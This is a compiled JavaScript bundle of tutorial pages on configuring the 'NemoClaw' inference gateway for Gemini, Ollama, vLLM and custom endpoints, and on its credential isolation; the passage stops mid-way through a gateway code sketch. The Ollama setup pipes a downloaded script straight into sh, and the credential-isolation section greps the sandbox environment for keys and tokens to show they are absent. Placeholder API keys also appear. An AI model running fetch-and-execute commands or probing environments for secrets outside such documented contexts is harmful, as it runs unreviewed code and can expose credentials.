e.jsxs("div",{className:"space-y-6",children:[e.jsx("h1",{className:"text-3xl font-bold text-gray-900 dark:text-gray-100",children:"Google Gemini Integration"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"NemoClaw supports Google's Gemini models as an inference provider. Gemini brings a distinctive set of strengths to the table: a massive 1-million-token context window (Gemini 1.5 Pro), strong multimodal capabilities, and competitive pricing. This section covers setup, configuration, and use cases where Gemini excels."}),e.jsx(a,{term:"Google Gemini",definition:"A family of multimodal large language models developed by Google DeepMind. Available in multiple sizes: Gemini 2.5 Pro (most capable), Gemini 2.0 Flash (fast and efficient), and others. Accessed through the Google AI Studio API or Vertex AI. Known for very large context windows and strong reasoning capabilities.",example:"Gemini 2.5 Pro can process an entire codebase (up to 1M tokens) in a single prompt, making it well-suited for agents that need broad codebase awareness.",seeAlso:["Google AI Studio","Vertex AI","Multimodal","Context Window"]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Setup and Configuration"}),e.jsx(l,{title:"Configuring Gemini as Inference Provider",steps:[{title:"Get a Google AI API key",content:"Go to Google AI Studio (aistudio.google.com) and generate an API key. Alternatively, use a Vertex AI service account for enterprise deployments.",code:`# Google AI Studio API key
# Looks like: AIzaSyA-aBcDeFgHiJkLmNoPqRsTuVwXyZ01234

# For Vertex AI, use a service account JSON key file instead`,language:"bash"},{title:"Store the credential",content:"Add the API key to NemoClaw's credential store.",code:`# For Google AI Studio
$ nemoclaw credentials set google_api_key
Enter value: AIzaSyA-aBcDeFgHiJkLmNoPqRsTuVwXyZ...
Credential stored (encrypted at rest).

# For Vertex AI (service account)
$ nemoclaw credentials set-file google_service_account \\
    /path/to/service-account.json
Credential file stored (encrypted at rest).`,language:"bash"},{title:"Configure the inference policy",content:"Update the inference policy to use Gemini.",code:`# .nemoclaw/policies/inference.yaml
inference:
  provider: google
  model: gemini-2.5-pro

  parameters:
    temperature: 0.7
    max_tokens: 8192
    # top_k: 40            # Google-specific parameter
    # top_p: 0.95

  credential: google_api_key

  # For Vertex AI instead of AI Studio:
  # provider: google-vertex
  # project: "my-gcp-project"
  # location: "us-central1"
  # credential: google_service_account`,language:"yaml"},{title:"Apply and verify",content:"Apply the configuration and test connectivity.",code:`$ nemoclaw apply
Planning... provider changed: nvidia -> google
Applying... inference gateway reconfigured
Done.

$ nemoclaw test-inference
Testing inference provider: google/gemini-2.5-pro
  Endpoint:     generativelanguage.googleapis.com
  Auth:         API key ****...4567
  Test prompt:  "Say hello"
  Response:     "Hello! How can I help you today?"
  Latency:      245ms
  Status:       OK`,language:"bash"}]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Available Gemini Models"}),e.jsx(i,{title:"Gemini Models for NemoClaw",headers:["Model","Context Window","Best For","Speed"],rows:[["gemini-2.5-pro","1M tokens","Complex reasoning, large codebase analysis","Moderate"],["gemini-2.5-flash","1M tokens","Fast coding tasks, high throughput","Fast"],["gemini-2.0-flash","1M tokens","Budget-friendly, quick iterations","Very fast"],["gemini-2.0-flash-lite","128K tokens","Simple tasks, lowest cost","Fastest"]]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Use Cases for Choosing Gemini"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Gemini is particularly well-suited for certain agent workloads where its strengths align with the task requirements:"}),e.jsx("h3",{className:"text-xl font-semibold text-gray-800 dark:text-gray-200",children:"Large Codebase Analysis"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"With a 1-million-token context window, Gemini 2.5 Pro can ingest an entire medium-sized codebase in a single prompt. This is valuable for agents that need to understand cross-file dependencies, perform large-scale refactoring, or analyze architectural patterns across many files. Other providers with 128K context windows would need to work with the codebase in chunks."}),e.jsx("h3",{className:"text-xl font-semibold text-gray-800 dark:text-gray-200",children:"Cost-Sensitive Workloads"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Gemini Flash models offer competitive pricing for high-throughput agent workloads. If your agent makes many inference calls (for example, iterating on code with rapid feedback loops), the Flash models can significantly reduce costs compared to larger models from other providers while maintaining good code quality."}),e.jsx("h3",{className:"text-xl font-semibold text-gray-800 dark:text-gray-200",children:"Multimodal Tasks"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Gemini models natively support image, audio, and video input. If your agent needs to analyze screenshots (UI testing), interpret diagrams (architecture review), or process documentation that includes images, Gemini's multimodal capabilities are a strong fit."}),e.jsxs(n,{type:"info",title:"API Translation",children:["Google's Gemini API uses a different format than OpenAI's. NemoClaw's blueprint handles the translation automatically. The agent in the sandbox always sends OpenAI-compatible requests to ",e.jsx("code",{children:"inference.local"}),", and the blueprint converts them to Gemini's format before forwarding. Response translation (Gemini format to OpenAI format) is also handled transparently."]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Vertex AI vs. AI Studio"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"NemoClaw supports both Google AI Studio (simpler, API key auth) and Vertex AI (enterprise, service account auth). Choose based on your needs:"}),e.jsx(i,{title:"AI Studio vs. Vertex AI",headers:["Aspect","Google AI Studio","Vertex AI"],rows:[["Authentication","API key","Service account / OAuth"],["Setup complexity","Simple","Requires GCP project setup"],["Rate limits","Per-key limits","Project-level, higher limits"],["Data residency","Google-managed","Configurable region"],["Enterprise features","Limited","VPC-SC, CMEK, audit logging"],["Best for","Development, small teams","Production, enterprise"]],highlightDiffs:!0}),e.jsx(t,{title:"Vertex AI configuration",language:"yaml",code:`# .nemoclaw/policies/inference.yaml (Vertex AI)
inference:
  provider: google-vertex
  model: gemini-2.5-pro

  # GCP project configuration
  project: "my-company-ai-project"
  location: "us-central1"   # Choose region closest to you

  parameters:
    temperature: 0.7
    max_tokens: 8192

  # Service account credential
  credential: google_service_account`}),e.jsx(r,{question:"When would you choose Gemini 2.5 Pro over GPT-4o for a NemoClaw agent?",options:["When you need the fastest possible response time","When the agent needs to analyze a large codebase (500K+ tokens) in a single context window","When you need the cheapest possible inference","When you need tool/function calling support"],correctIndex:1,explanation:"Gemini 2.5 Pro's 1-million-token context window is its key differentiator. GPT-4o supports 128K tokens, which may not be enough to include an entire medium-to-large codebase. If your agent needs whole-codebase awareness (for architectural analysis, large refactors, or cross-file dependency tracking), Gemini's larger context window is the deciding factor."}),e.jsx(s,{references:[{title:"Google AI for Developers",url:"https://ai.google.dev/",type:"docs",description:"Google AI Studio documentation and API reference."},{title:"Vertex AI Gemini API",url:"https://cloud.google.com/vertex-ai/generative-ai/docs",type:"docs",description:"Enterprise Gemini access through Vertex AI."},{title:"NemoClaw Google Provider Guide",url:"https://docs.nvidia.com/nemoclaw/providers/google",type:"docs",description:"Configuring Google Gemini in NemoClaw."}]})]})}const Y=Object.freeze(Object.defineProperty({__proto__:null,default:I},Symbol.toStringTag,{value:"Module"}));function S(){return e.jsxs("div",{className:"space-y-6",children:[e.jsx("h1",{className:"text-3xl font-bold text-gray-900 dark:text-gray-100",children:"Local Inference: Ollama and vLLM"}),e.jsxs("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:["Not every workload requires -- or can use -- a cloud inference provider. Air-gapped environments, data sovereignty requirements, cost optimization, and privacy concerns all drive demand for local inference. NemoClaw supports two local inference backends: ",e.jsx("strong",{children:"Ollama"})," for lightweight development and experimentation, and ",e.jsx("strong",{children:"vLLM"})," for production-grade local inference with full GPU optimization."]}),e.jsx(i,{title:"Ollama vs. vLLM",headers:["Aspect","Ollama","vLLM"],rows:[["Use case","Development, lightweight tasks","Production, high throughput"],["Setup complexity","Very simple (one binary)","Moderate (Python, CUDA)"],["Model management","Built-in (ollama pull)","Manual or HuggingFace Hub"],["GPU support","Optional (CPU fallback)","Required (CUDA)"],["Quantization","GGUF (4-bit, 8-bit)","AWQ, GPTQ, FP16, BF16"],["Throughput","Single user","High concurrency, batching"],["API format","OpenAI-compatible","OpenAI-compatible"],["Min GPU VRAM","4GB (small models)","16GB+ (recommended)"]],highlightDiffs:!0}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Setting Up Ollama"}),e.jsx(a,{term:"Ollama",definition:"A lightweight tool for running large language models locally. It provides a simple CLI for downloading, running, and managing models, with an OpenAI-compatible API endpoint. Ollama handles model quantization and can run on CPU (slowly) or GPU (fast). It is ideal for development and experimentation.",example:"ollama run codellama:13b -- starts a 13-billion parameter coding model locally.",seeAlso:["GGUF","Quantization","llama.cpp"]}),e.jsx(l,{title:"Configuring NemoClaw with Ollama",steps:[{title:"Install Ollama",content:"Download and install Ollama on the host machine (not inside the sandbox).",code:`# Install Ollama
$ curl -fsSL https://ollama.com/install.sh | sh

# Verify installation
$ ollama --version
ollama version 0.6.2`,language:"bash"},{title:"Pull a model",content:"Download a coding model. Choose based on your available VRAM and desired quality.",code:`# Recommended coding models (choose based on VRAM):

# 8GB VRAM: good for basic coding tasks
$ ollama pull codellama:7b

# 16GB VRAM: better quality
$ ollama pull codellama:34b

# 24GB+ VRAM: best local quality
$ ollama pull deepseek-coder-v2:latest

# CPU-only (slow but works): small model
$ ollama pull codellama:7b-code-q4_0`,language:"bash"},{title:"Start the Ollama server",content:"Ollama runs as a background service. It starts automatically on most systems after installation.",code:`# Check if Ollama is running
$ ollama list
NAME                    SIZE
codellama:34b           19 GB
deepseek-coder-v2       8.9 GB

# If not running, start it
$ ollama serve &

# Verify the API is accessible
$ curl http://localhost:11434/v1/models
{"data":[{"id":"codellama:34b",...}]}`,language:"bash"},{title:"Configure NemoClaw inference policy",content:"Point NemoClaw to the local Ollama endpoint.",code:`# .nemoclaw/policies/inference.yaml
inference:
  provider: ollama
  model: codellama:34b

  # Ollama runs on the host, no API key needed
  endpoint: "http://localhost:11434"
  credential: none   # Local inference, no auth required

  parameters:
    temperature: 0.7
    max_tokens: 4096
    # num_ctx: 8192   # Ollama-specific: context window size`,language:"yaml"},{title:"Apply and test",content:"Apply the configuration. NemoClaw will route inference through the gateway to the local Ollama server.",code:`$ nemoclaw apply
Planning... provider changed: nvidia -> ollama (local)
Applying... inference gateway reconfigured
Note: Local inference -- no cloud credentials needed.
Done.

$ nemoclaw test-inference
Testing inference provider: ollama/codellama:34b
  Endpoint:     localhost:11434 (local)
  Auth:         none
  Test prompt:  "Say hello"
  Response:     "Hello! I'm here to help with coding."
  Latency:      89ms (time to first token)
  Status:       OK`,language:"bash"}]}),e.jsxs(n,{type:"info",title:"How Local Inference Routing Works",children:["Even with local inference, the sandbox agent still talks to"," ",e.jsx("code",{children:"inference.local"}),". The OpenShell gateway forwards the request to the blueprint, which routes it to ",e.jsx("code",{children:"localhost:11434"})," (Ollama) on the host. The agent never communicates directly with Ollama -- the gateway architecture is maintained for consistency and so that switching between local and cloud inference requires only a config change."]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Setting Up vLLM"}),e.jsx(a,{term:"vLLM",definition:"A high-throughput, memory-efficient inference engine for large language models. It uses PagedAttention for efficient GPU memory management and supports continuous batching for high concurrency. vLLM provides an OpenAI-compatible API and is the recommended choice for production local inference.",example:"vllm serve codellama/CodeLlama-34b-Instruct-hf --tensor-parallel-size 2",seeAlso:["PagedAttention","Tensor Parallelism","HuggingFace"]}),e.jsx(l,{title:"Configuring NemoClaw with vLLM",steps:[{title:"Install vLLM",content:"Install vLLM in a Python environment on the host. Requires CUDA and a compatible GPU.",code:`# Create a virtual environment (recommended)
$ python3 -m venv ~/.vllm-env
$ source ~/.vllm-env/bin/activate

# Install vLLM
$ pip install vllm

# Verify GPU access
$ python3 -c "import torch; print(torch.cuda.is_available())"
True`,language:"bash"},{title:"Start the vLLM server",content:"Launch vLLM with your chosen model. It will download the model from HuggingFace on first run.",code:`# Single GPU (24GB+ VRAM)
$ vllm serve codellama/CodeLlama-34b-Instruct-hf \\
    --host 0.0.0.0 \\
    --port 8000 \\
    --max-model-len 8192

# Multi-GPU (tensor parallelism)
$ vllm serve codellama/CodeLlama-70b-Instruct-hf \\
    --host 0.0.0.0 \\
    --port 8000 \\
    --tensor-parallel-size 2 \\
    --max-model-len 8192

# With quantization (less VRAM needed)
$ vllm serve TheBloke/CodeLlama-34B-Instruct-AWQ \\
    --host 0.0.0.0 \\
    --port 8000 \\
    --quantization awq`,language:"bash"},{title:"Configure NemoClaw inference policy",content:"Point NemoClaw to the vLLM endpoint.",code:`# .nemoclaw/policies/inference.yaml
inference:
  provider: vllm
  model: codellama/CodeLlama-34b-Instruct-hf

  endpoint: "http://localhost:8000"
  credential: none

  parameters:
    temperature: 0.7
    max_tokens: 4096`,language:"yaml"},{title:"Apply and test",content:"Apply the configuration and verify connectivity.",code:`$ nemoclaw apply
Planning... provider: vllm (local)
Applying... inference gateway reconfigured
Done.

$ nemoclaw test-inference
Testing inference provider: vllm/codellama-34b-instruct
  Endpoint:     localhost:8000 (local)
  Auth:         none
  Test prompt:  "Say hello"
  Response:     "Hello! How can I assist you with coding?"
  Latency:      45ms (time to first token)
  Throughput:   ~120 tokens/sec
  Status:       OK`,language:"bash"}]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"GPU Requirements"}),e.jsx(i,{title:"GPU VRAM Requirements by Model Size",headers:["Model Size","FP16 VRAM","Quantized (4-bit) VRAM","Recommended GPU"],rows:[["7B parameters","14 GB","4 GB","RTX 3060 12GB (quantized)"],["13B parameters","26 GB","8 GB","RTX 4070 Ti 16GB (quantized)"],["34B parameters","68 GB","20 GB","RTX 4090 24GB (quantized)"],["70B parameters","140 GB","40 GB","2x RTX 4090 or A100 80GB"]]}),e.jsx(o,{title:"GPU Memory Is the Bottleneck",children:"Local inference performance is almost entirely determined by GPU VRAM. If the model does not fit in VRAM, it will be partially offloaded to system RAM (with Ollama) or fail to load (with vLLM). Quantized models (4-bit) use roughly 4x less VRAM than full-precision models, with modest quality loss. For coding tasks, 4-bit quantization is generally acceptable."}),e.jsxs(n,{type:"tip",title:"When to Use Local vs. Cloud",children:[e.jsxs("p",{children:["Use ",e.jsx("strong",{children:"local inference"})," when you need:"]}),e.jsxs("ul",{className:"list-disc list-inside mt-2 space-y-1",children:[e.jsx("li",{children:"Air-gapped or offline environments"}),e.jsx("li",{children:"Data that must not leave your premises"}),e.jsx("li",{children:"Zero inference cost (after hardware investment)"}),e.jsx("li",{children:"Lowest possible latency (no network round-trip)"})]}),e.jsxs("p",{className:"mt-2",children:["Use ",e.jsx("strong",{children:"cloud inference"})," when you need:"]}),e.jsxs("ul",{className:"list-disc list-inside mt-2 space-y-1",children:[e.jsx("li",{children:"State-of-the-art model quality (GPT-4o, Claude, Nemotron 120B)"}),e.jsx("li",{children:"No GPU hardware investment"}),e.jsx("li",{children:"Scalability beyond a single machine"})]})]}),e.jsx(s,{references:[{title:"Ollama",url:"https://ollama.com/",type:"docs",description:"Official Ollama documentation and model library."},{title:"vLLM Documentation",url:"https://docs.vllm.ai/",type:"docs",description:"Official vLLM documentation for high-performance local inference."},{title:"NemoClaw Local Inference Guide",url:"https://docs.nvidia.com/nemoclaw/providers/local",type:"docs",description:"Configuring Ollama and vLLM with NemoClaw."}]})]})}const J=Object.freeze(Object.defineProperty({__proto__:null,default:S},Symbol.toStringTag,{value:"Module"}));function C(){return e.jsxs("div",{className:"space-y-6",children:[e.jsx("h1",{className:"text-3xl font-bold text-gray-900 dark:text-gray-100",children:"Custom Endpoints"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Many organizations run their own inference infrastructure: private model deployments behind a corporate firewall, fine-tuned models hosted on internal servers, or third-party inference services that expose OpenAI-compatible or Anthropic-compatible APIs. NemoClaw supports custom endpoints for both API formats, making it easy to integrate with any private deployment."}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"OpenAI-Compatible Endpoints"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Any service that implements the OpenAI Chat Completions API can be used as a NemoClaw inference provider. This includes a wide range of tools and platforms:"}),e.jsxs("ul",{className:"list-disc list-inside space-y-2 text-gray-700 dark:text-gray-300",children:[e.jsx("li",{children:"vLLM, TGI (Text Generation Inference), and other self-hosted engines"}),e.jsx("li",{children:"Azure OpenAI Service"}),e.jsx("li",{children:"Together AI, Fireworks AI, Groq, and other cloud inference providers"}),e.jsx("li",{children:"LiteLLM proxy (routes to any backend)"}),e.jsxs("li",{children:["Any custom server implementing ",e.jsx("code",{className:"text-sm bg-gray-100 dark:bg-gray-800 px-1 rounded",children:"/v1/chat/completions"})]})]}),e.jsx(t,{title:"OpenAI-compatible custom endpoint configuration",language:"yaml",code:`# .nemoclaw/policies/inference.yaml

# Example 1: Corporate vLLM deployment
inference:
  provider: openai-compatible
  model: internal/codellama-70b-ft
  endpoint: "https://inference.internal.company.com"
  credential: internal_api_key

  parameters:
    temperature: 0.7
    max_tokens: 4096

---
# Example 2: Azure OpenAI
inference:
  provider: openai-compatible
  model: gpt-4o
  endpoint: "https://my-resource.openai.azure.com/openai/deployments/gpt-4o"
  credential: azure_openai_key

  # Azure requires an API version header
  headers:
    api-version: "2024-10-21"

---
# Example 3: Together AI
inference:
  provider: openai-compatible
  model: meta-llama/Llama-3.3-70B-Instruct-Turbo
  endpoint: "https://api.together.xyz"
  credential: together_api_key`}),e.jsxs(n,{type:"info",title:"The OpenAI API Is a De Facto Standard",children:["The OpenAI Chat Completions API format has become a de facto standard in the inference ecosystem. Most modern inference engines implement it, even for non-OpenAI models. NemoClaw leverages this by supporting any endpoint that speaks this protocol. The"," ",e.jsx("code",{children:"openai-compatible"})," provider type sends standard OpenAI-format requests and expects standard OpenAI-format responses."]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Anthropic-Compatible Endpoints"}),e.jsxs("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:["For services that implement Anthropic's Messages API (rather than OpenAI's format), NemoClaw provides the"," ",e.jsx("code",{className:"text-sm bg-gray-100 dark:bg-gray-800 px-1 rounded",children:"anthropic-compatible"})," provider type. This handles the API format translation between the agent's OpenAI-format requests and the Anthropic-format endpoint."]}),e.jsx(t,{title:"Anthropic-compatible custom endpoint",language:"yaml",code:`# .nemoclaw/policies/inference.yaml

# Example: AWS Bedrock with Claude models
inference:
  provider: anthropic-compatible
  model: anthropic.claude-sonnet-4-20250514-v1:0
  endpoint: "https://bedrock-runtime.us-east-1.amazonaws.com"
  credential: aws_bedrock_key

  # AWS-specific headers
  headers:
    x-amzn-bedrock-region: "us-east-1"

---
# Example: Self-hosted Anthropic-compatible proxy
inference:
  provider: anthropic-compatible
  model: claude-sonnet-4-20250514
  endpoint: "https://claude-proxy.internal.company.com"
  credential: internal_proxy_key`}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Custom Headers and Authentication"}),e.jsxs("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:["Custom endpoints often require non-standard authentication headers, API version headers, or other custom headers. NemoClaw supports these through the"," ",e.jsx("code",{className:"text-sm bg-gray-100 dark:bg-gray-800 px-1 rounded",children:"headers"})," field and flexible authentication options:"]}),e.jsx(t,{title:"Custom authentication configurations",language:"yaml",code:`# .nemoclaw/policies/inference.yaml

# Standard Bearer token (default for OpenAI-compatible)
inference:
  provider: openai-compatible
  endpoint: "https://api.example.com"
  credential: my_api_key
  auth_type: bearer   # Sends: Authorization: Bearer <key>

---
# API key in custom header
inference:
  provider: openai-compatible
  endpoint: "https://api.example.com"
  credential: my_api_key
  auth_type: custom
  auth_header: "X-API-Key"  # Sends: X-API-Key: <key>

---
# Multiple credentials (e.g., OAuth + API key)
inference:
  provider: openai-compatible
  endpoint: "https://api.example.com"
  credentials:
    - name: oauth_token
      header: "Authorization"
      prefix: "Bearer "
    - name: org_api_key
      header: "X-Organization-Key"

---
# Static headers (non-secret)
inference:
  provider: openai-compatible
  endpoint: "https://api.example.com"
  credential: my_api_key
  headers:
    X-Request-Source: "nemoclaw"
    X-Environment: "production"
    api-version: "2024-10-21"`}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Testing Custom Endpoints"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Before deploying a custom endpoint configuration to your team, test it thoroughly:"}),e.jsx(t,{title:"Testing and debugging custom endpoints",language:"bash",code:`# Basic connectivity test
$ nemoclaw test-inference
Testing inference provider: openai-compatible/internal-codellama-70b
  Endpoint:     inference.internal.company.com
  Auth:         Bearer ****...
  Test prompt:  "Say hello"
  Response:     "Hello! How can I assist you?"
  Latency:      156ms
  Status:       OK

# Verbose test (shows full request/response for debugging)
$ nemoclaw test-inference --verbose
Request:
  POST https://inference.internal.company.com/v1/chat/completions
  Headers:
    Authorization: Bearer ****...
    Content-Type: application/json
    X-Request-Source: nemoclaw
  Body:
    {"model":"internal/codellama-70b-ft","messages":[...],"temperature":0.7}

Response:
  Status: 200 OK
  Body:
    {"id":"chatcmpl-...","choices":[...],"usage":{...}}

# Test from inside the sandbox
$ nemoclaw exec -- python3 -c "
import httpx
r = httpx.post('https://inference.local/v1/chat/completions',
    json={'model': 'internal/codellama-70b-ft',
          'messages': [{'role': 'user', 'content': 'Hello'}]})
print(r.json()['choices'][0]['message']['content'])
"
Hello! How can I help you today?`}),e.jsxs(o,{title:"Endpoint URL Must Be Exact",children:["Pay careful attention to the endpoint URL format. Some providers require a base URL (e.g., ",e.jsx("code",{children:"https://api.example.com"}),"), while others require the full path (e.g., ",e.jsx("code",{children:"https://api.example.com/v1"}),"). If you get 404 errors, check whether the provider expects"," ",e.jsx("code",{children:"/v1/chat/completions"})," to be appended to your endpoint URL or if it is already part of the URL."]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Network Policy for Custom Endpoints"}),e.jsxs("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:["When using a custom endpoint, remember that the blueprint (not the sandbox) makes the outbound connection. The sandbox still only talks to"," ",e.jsx("code",{className:"text-sm bg-gray-100 dark:bg-gray-800 px-1 rounded",children:"inference.local"}),". However, if your custom endpoint is behind a firewall, the host machine running the blueprint must have network access to it."]}),e.jsx(i,{title:"Network Access Requirements",headers:["Component","Needs Access To","Configured Via"],rows:[["Sandbox (agent)","inference.local only","Network namespace (automatic)"],["Blueprint (host)","Custom endpoint URL","Host network (no NemoClaw config needed)"],["Host firewall","Custom endpoint IP/port","Your network infrastructure"]]}),e.jsx(r,{question:"Your company runs a fine-tuned LLaMA model on vLLM at https://llm.internal.corp:8000. What provider type should you use in NemoClaw?",options:["provider: nvidia (since LLaMA is an NVIDIA model)","provider: openai-compatible (since vLLM exposes an OpenAI-compatible API)","provider: vllm (NemoClaw has a dedicated vLLM provider)","provider: custom (for any non-standard endpoint)"],correctIndex:1,explanation:"vLLM exposes an OpenAI-compatible API (/v1/chat/completions), so you should use the openai-compatible provider type. While NemoClaw does have a dedicated vllm provider shortcut for local vLLM instances, the openai-compatible provider works for any vLLM deployment, including remote ones behind a corporate firewall."}),e.jsx(s,{references:[{title:"NemoClaw Custom Endpoints Guide",url:"https://docs.nvidia.com/nemoclaw/providers/custom",type:"docs",description:"Complete guide to configuring custom inference endpoints."},{title:"OpenAI Chat Completions API Spec",url:"https://platform.openai.com/docs/api-reference/chat",type:"docs",description:"The API specification that openai-compatible endpoints must implement."}]})]})}const X=Object.freeze(Object.defineProperty({__proto__:null,default:C},Symbol.toStringTag,{value:"Module"}));function T(){return e.jsxs("div",{className:"space-y-6",children:[e.jsx("h1",{className:"text-3xl font-bold text-gray-900 dark:text-gray-100",children:"Credential Isolation"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"The single most important security property of NemoClaw's inference architecture is that API credentials never enter the sandbox. This is not a matter of hiding them in an environment variable or obscuring them in a config file -- they physically do not exist in the sandbox's memory, filesystem, or environment. This section explains exactly how this isolation works and why it matters."}),e.jsx(c,{title:"Credential Isolation Boundary",components:[{name:"Sandbox",description:"No credentials exist here",color:"orange"},{name:"Network Namespace",description:"Isolation boundary",color:"gray"},{name:"OpenShell Gateway",description:"Bridge (no credentials)",color:"blue"},{name:"Blueprint Process",description:"Credentials live here",color:"green"},{name:"Credential Store",description:"Encrypted at rest",color:"purple"},{name:"Inference API",description:"Receives credentials",color:"red"}],connections:[{from:"Sandbox",to:"OpenShell Gateway",label:"request (no creds)"},{from:"OpenShell Gateway",to:"Blueprint Process",label:"IPC (no creds)"},{from:"Blueprint Process",to:"Credential Store",label:"loads key"},{from:"Blueprint Process",to:"Inference API",label:"request + creds"}]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"How Credentials Stay on the Host"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"The credential isolation relies on three mechanisms working together:"}),e.jsx("h3",{className:"text-xl font-semibold text-gray-800 dark:text-gray-200",children:"1. The Credential Store"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"API keys are stored in NemoClaw's host-side credential store, a directory accessible only to the blueprint process. Credentials are encrypted at rest using a key derived from the user's system keychain (or a configured secret on headless systems). The credential store is never mounted into the sandbox."}),e.jsx(t,{title:"Credential store internals",language:"bash",code:`# Credential store location
$ ls -la ~/.nemoclaw/credentials/
total 16
drwx------ 2 user user 4096 Nov 15 10:00 .
-rw------- 1 user user  256 Nov 15 10:00 nvidia_api_key.enc
-rw------- 1 user user  256 Nov 15 10:00 openai_api_key.enc
-rw------- 1 user user  256 Nov 15 10:00 anthropic_api_key.enc

# Note the permissions: 700 on directory, 600 on files
# Only the owner (blueprint process runs as this user) can read

# Inside the sandbox, this path does not exist:
$ nemoclaw exec -- ls ~/.nemoclaw/credentials/
ls: cannot access '/home/user/.nemoclaw/credentials/': No such file or directory
# Landlock denies access to /home entirely`}),e.jsx("h3",{className:"text-xl font-semibold text-gray-800 dark:text-gray-200",children:"2. Clean Environment"}),e.jsxs("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:["When OpenShell creates a sandbox, it starts with a clean environment. No environment variables from the host shell are inherited by the sandboxed process. This means that even if you have"," ",e.jsx("code",{className:"text-sm bg-gray-100 dark:bg-gray-800 px-1 rounded",children:"OPENAI_API_KEY"})," set in your ",e.jsx("code",{className:"text-sm bg-gray-100 dark:bg-gray-800 px-1 rounded",children:".bashrc"}),", it will not be visible inside the sandbox."]}),e.jsx(t,{title:"Environment isolation",language:"bash",code:`# On the host
$ echo $OPENAI_API_KEY
sk-proj-aBcDeFgHiJkLmNoPqRsT...

$ echo $NVIDIA_API_KEY
nvapi-aBcDeFgHiJkLmNoPqRsT...

# Inside the sandbox -- none of these exist
$ nemoclaw exec -- env | grep -i api_key
# (no output)

$ nemoclaw exec -- env | grep -i key
# (no output)

$ nemoclaw exec -- env | grep -i token
# (no output)

# The sandbox environment contains only:
$ nemoclaw exec -- env
HOME=/sandbox
PATH=/usr/local/bin:/usr/bin:/bin
SHELL=/bin/bash
TERM=xterm-256color
LANG=en_US.UTF-8
NEMOCLAW_SANDBOX=true
INFERENCE_ENDPOINT=https://inference.local`}),e.jsx("h3",{className:"text-xl font-semibold text-gray-800 dark:text-gray-200",children:"3. Network Namespace Boundary"}),e.jsxs("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:["Even if an attacker inside the sandbox somehow discovered a credential (which they cannot, because it does not exist there), they could not use it directly. The sandbox's network namespace only allows traffic to"," ",e.jsx("code",{className:"text-sm bg-gray-100 dark:bg-gray-800 px-1 rounded",children:"inference.local"})," and other explicitly whitelisted endpoints. Direct connections to"," ",e.jsx("code",{className:"text-sm bg-gray-100 dark:bg-gray-800 px-1 rounded",children:"api.openai.com"})," or"," ",e.jsx("code",{className:"text-sm bg-gray-100 dark:bg-gray-800 px-1 rounded",children:"build.nvidia.com"})," are blocked at the network level."]}),e.jsx(a,{term:"Defense in Depth",definition:"A security strategy that uses multiple independent layers of protection. In NemoClaw's credential isolation: (1) credentials are not in the sandbox filesystem (Landlock), (2) credentials are not in the sandbox environment (clean env), (3) even if credentials were obtained, the network namespace prevents direct API access. All three layers must fail for a credential leak to occur.",example:"An attacker who exploits a code execution vulnerability inside the sandbox still cannot leak credentials because they face three independent barriers.",seeAlso:["Landlock","Network Namespace","Credential Store","Zero Trust"]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"The Gateway's Role"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"The OpenShell gateway bridges the sandbox and host network namespaces. It is a critical component in the credential isolation architecture. Here is exactly what happens when an inference request flows through the gateway:"}),e.jsx(t,{title:"Gateway request processing (conceptual)",language:"python",code:`class InferenceGateway:
    """Runs on the host, bridges sandbox and external network."""

    async def handle_sandbox_request(self, request):
        # Step 1: Validate the request
        #   - Must be a valid inference API request
        #   - Model must be in the allowlist
        #   - No suspicious headers or payloads
        self.validate(request)

        # Step 2: Strip all headers from the sandbox
        #   - Agent might try to inject auth headers
        #   - Agent might try to add routing headers
        sanitized = {
            "model": request.json["model"],
            "messages": request.json["messages"],
            "temperature": request.json.get("temperature", 0.7),
            "max_tokens": request.json.get("max_tokens", 4096),
        }

        # Step 3: Load credentials from the host-side store
        creds = self.credential_store.get(self.config.credential_name)

        # Step 4: Forward to the real endpoint WITH credentials
        response = await self.http_client.post(
            self.config.endpoint + "/v1/chat/completions",
            json=sanitized,
            headers={
                "Authorization": f"Bearer {creds}",
                "Content-Type": "application/json",
            }
        )

